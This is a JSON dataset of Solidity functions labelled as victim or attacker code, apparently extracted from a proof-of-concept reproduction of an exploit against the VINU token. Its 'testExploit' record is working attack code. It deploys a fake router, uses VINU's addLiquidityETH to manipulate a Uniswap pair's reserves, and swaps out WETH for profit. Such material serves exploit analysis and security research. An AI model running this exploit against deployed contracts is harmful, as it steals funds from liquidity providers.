[
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "addLiquidityETH",
    "original_code": "    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) {\n        (amountToken, amountETH) = _addLiquidity(\n            token,\n            WETH,\n            amountTokenDesired,\n            msg.value,\n            amountTokenMin,\n            amountETHMin\n        );\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n        IWETH(WETH).deposit{value: amountETH}();\n        assert(IWETH(WETH).transfer(pair, amountETH));\n        liquidity = IUniswapV2Pair(pair).mint(to);\n        // refund dust eth, if any\n        if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n    }\n\n    // **** REMOVE LIQUIDITY ****\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(\n        address spender,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(\n        address account\n    ) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVINU",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Router",
    "source_type": "victim_contract",
    "function_name": "WETH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Router",
    "source_type": "victim_contract",
    "function_name": "createPair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Router",
    "source_type": "victim_contract",
    "function_name": "factory",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        deal(address(this), 0.5 ether);\n        cheats.createSelectFork(\"mainnet\", 17_421_006);\n        cheats.label(address(VINU), \"VINU\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(UniswapV2Router02), \"UniswapV2Router02\");\n        cheats.label(flashbotsAddress, \"flashbotsAddress\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VinuTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker's contract ETH balance before attack\", address(this).balance, 18);\n\n        emit log_named_decimal_uint(\n            \"Attacker's contract WETH balance before attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(VINU);\n        UniswapV2Router02.swapExactETHForTokens{value: 0.1 ether}(0, path, address(this), block.timestamp + 100);\n\n        // Deploying fake Router contract\n        FakeRouter = new Router();\n\n        // Manipulating the price of VINU\n        for (uint256 i; i < 4; ++i) {\n            VINU.addLiquidityETH(address(FakeRouter), address(this), address(Pair));\n        }\n        Pair.sync();\n        uint256 amountIn = VINU.balanceOf(address(this));\n        VINU.transfer(address(Pair), VINU.balanceOf(address(this)));\n\n        (uint112 reserveWETH, uint112 reserveVINU,) = Pair.getReserves();\n        flashbotsAddress.call{value: 0.000000001 ether}(\"\");\n        uint256 amountOut = UniswapV2Router02.getAmountOut(amountIn, reserveVINU, reserveWETH);\n\n        Pair.swap(amountOut, 0, address(this), \"\");\n\n        emit log_named_decimal_uint(\"Attacker's contract ETH balance after attack\", address(this).balance, 18);\n\n        emit log_named_decimal_uint(\n            \"Attacker's contract WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n",
    "description": ""
  }
]